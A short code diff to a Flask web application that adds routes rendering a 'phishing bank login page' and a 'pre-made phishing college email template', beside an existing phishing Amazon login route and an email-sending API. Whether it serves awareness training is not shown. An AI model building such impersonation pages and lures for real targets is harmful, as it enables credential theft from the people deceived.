@@ -243,6 +243,16 @@ def amazon_login_page():
     """Renders the phishing amazon login page."""
     return render_template('amazon_login.html')
 
+@app.route("/bank_login", methods=['GET'])
+def bank_login_page():
+    """Renders the phishing bank login page."""
+    return render_template('bank_login.html')
+
+@app.route("/college_email", methods=['GET'])
+def college_email_page():
+    """Renders the pre-made phishing college email template."""
+    return render_template('college_email.html')
+
 # --- API Routes for Sending Messages ---
 
 @app.route("/send-email", methods=['POST'])
